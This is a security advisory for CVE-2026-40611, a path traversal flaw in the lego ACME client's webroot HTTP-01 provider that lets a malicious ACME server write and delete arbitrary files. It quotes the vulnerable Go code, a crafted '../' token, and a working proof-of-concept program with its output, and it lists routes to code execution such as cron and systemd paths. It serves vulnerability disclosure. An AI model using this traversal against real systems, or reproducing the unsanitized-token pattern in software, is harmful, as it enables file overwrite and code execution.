# [H] ACME Lego: Arbitrary File Write via Path Traversal in Webroot HTTP-01 Provider

## Summary
Severity: High
Advisory: GHSA-qqx8-2xmm-jrv8
CVE: CVE-2026-40611
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-qqx8-2xmm-jrv8
Type: github-advisory

## Affected
- Go: `github.com/go-acme/lego/v4` — affected >=0 <4.34.0
- Go: `github.com/go-acme/lego/v3` — affected >=0
- Go: `github.com/go-acme/lego` — affected >=0

## Details
### Summary

The webroot HTTP-01 challenge provider in lego is vulnerable to arbitrary file write and deletion via path traversal. A malicious ACME server can supply a crafted challenge token containing `../` sequences, causing lego to write attacker-influenced content to any path writable by the lego process. 

### Details

The `ChallengePath()` function in `challenge/http01/http_challenge.go:26-27` constructs the challenge file path by directly concatenating the ACME token without any validation:

```go
func ChallengePath(token string) string {
	return "/.well-known/acme-challenge/" + token
}
```

The webroot provider in `providers/http/webroot/webroot.go:31` then joins this with the configured webroot directory and writes the key authorization content to the resulting path:

```go
challengeFilePath := filepath.Join(w.path, http01.ChallengePath(token))
err = os.MkdirAll(filepath.Dir(challengeFilePath), 0o755)
err = os.WriteFile(challengeFilePath, []byte(keyAuth), 0o644)
```

RFC 8555 Section 8.3 specifies that ACME tokens must only contain characters from the base64url alphabet (`[A-Za-z0-9_-]`), but this constraint is never enforced anywhere in the codebase. When a malicious ACME server returns a token such as `../../../../../../tmp/evil`, `filepath.Join()` resolves the `..` components, producing a path outside the webroot directory.

The same vulnerability exists in the `CleanUp()` function at `providers/http/webroot/webroot.go:48`, which deletes the challenge file using the same unsanitized path:

```go
err := os.Remove(filepath.Join(w.path, http01.ChallengePath(token)))
```

This additionally enables arbitrary file deletion.

### PoC

In a real attack scenario, the victim uses `--server` to point lego at a malicious ACME server, combined with `--http.webroot`:

```bash
lego --server https://malicious-acme.example.com \
     --http --http.webroot /var/www/html \
     --email user@example.com \
     --domains example.com \
     run
```

The malicious server returns a challenge token containing path traversal sequences `../../../../../../tmp/pwned`. lego's webroot provider writes the key authorization to the traversed path without validation, resulting in arbitrary file write outside the webroot.

The following minimal Go program demonstrates the core vulnerability by directly calling the webroot provider with a crafted token:

```go
package main

import (
	"fmt"
	"os"

	"github.com/go-acme/lego/v4/providers/http/webroot"
)

func main() {
	webrootDir, _ := os.MkdirTemp("", "lego-webroot-*")
	defer os.RemoveAll(webrootDir)

	provider, _ := webroot.NewHTTPProvider(webrootDir)
	token := "../../../../../../../../../../tmp/pwned"
	provider.Present("example.com", token, "EXPLOITED-BY-PATH-TRAVERSAL")

	data, err := os.ReadFile("/tmp/pwned")
	if err == nil {
		fmt.Println("[+] VULNERABILITY CONFIRMED")
		fmt.Printf("[+] File written outside webroot: /tmp/pwned\n")
		fmt.Printf("[+] Content: %s\n", data)
	}
}
```

```bash
go build -o exploit ./exploit.go && ./exploit
```

Expected output:

```
[+] VULNERABILITY CONFIRMED
[+] File written outside webroot: /tmp/pwned
[+] Content: EXPLOITED-BY-PATH-TRAVERSAL
```

### Impact

This is a path traversal vulnerability (CWE-22). Any user running lego with the HTTP-01 challenge solver against a malicious or compromised ACME server is affected.

A malicious ACME server can:

- Achieve remote code execution by writing to cron directories, systemd unit paths, shell profiles, or web application directories served by the webroot.
- Destroy data by overwriting configuration files, TLS certificates, or application state.
- Escalate privileges if lego runs as root, granting unrestricted filesystem write access.
- Delete arbitrary files via the `CleanUp()` code path using the same unsanitized token.

## References
- https://github.com/go-acme/lego/security/advisories/GHSA-qqx8-2xmm-jrv8
- https://nvd.nist.gov/vuln/detail/CVE-2026-40611
- https://github.com/go-acme/lego
